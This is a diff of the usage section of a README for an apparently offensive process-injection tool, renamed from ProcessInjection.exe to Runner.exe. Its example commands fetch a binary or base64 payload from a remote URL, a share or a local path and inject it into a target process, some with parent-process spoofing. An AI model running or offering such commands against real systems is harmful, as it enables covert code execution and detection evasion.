@@ -7,9 +7,16 @@ Additional Techniques yoinked from 3xpl01tc0d3r: https://github.com/3xpl01tc0d3r
 ## Usage
 
 ```
-Usage: ProcessInjection.exe <pid|self> <binlocation> <bintype>");
-    Example: ProcessInjection.exe self http://x.x.x.x/app.b64 b64");
-    Example: ProcessInjection.exe 1000 C:\Temp\app.bin bin");
+Runner Help:
+    Usage: Runner.exe [options]
+    Example: Runner.exe targ=http://fun/targ.bin form=bin meth=simple pid=1000
+    Example: Runner.exe targ=C:\path\to\targ.b64 form=b64 meth=simple pid=self
+    Example: Runner.exe targ=\\some\share\path\to\targ.b64 form=b64 meth=simple pid=explorer
+    Example: Runner.exe targ=https://fun/targ.bin form=b64 meth=simple parent=1000 spawn=C:\path\to\custom.exe
+    Example: Runner.exe targ=https://fun/targ.bin form=b64 meth=simple parent=explorer spawn=notepad.exe
+Defaults:
+    meth => simple
+    form => bin
 ```
 
 ## Target and Format
